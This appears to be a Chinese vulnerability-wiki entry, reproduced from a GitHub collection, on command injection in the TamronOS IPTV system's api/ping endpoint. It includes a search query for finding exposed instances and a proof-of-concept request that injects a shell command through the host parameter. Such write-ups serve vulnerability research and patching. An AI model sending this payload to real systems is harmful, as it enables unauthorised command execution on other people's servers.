---
title: "TamronOS IPTV系统 ping 任意命令执行漏洞"
date: 2026-10-16 09:09:23
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "TamronOS-IPTV系统-ping"
tags:
  - "TamronOS-IPTV系统-ping"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

TamronOS IPTV系统 api/ping 存在任意命令执行漏洞，攻击者通过漏洞可以执行任意命令

## 漏洞影响

```
TamronOS IPTV系统
```

## 网络测绘

```
app="TamronOS-IPTV系统"
```

## 漏洞复现

登录页面如下



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101926621.png)



## 漏洞POC为



```plain
/api/ping?count=5&host=;id;
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101927800.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/TamronOS-IPTV%E7%B3%BB%E7%BB%9F-ping-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
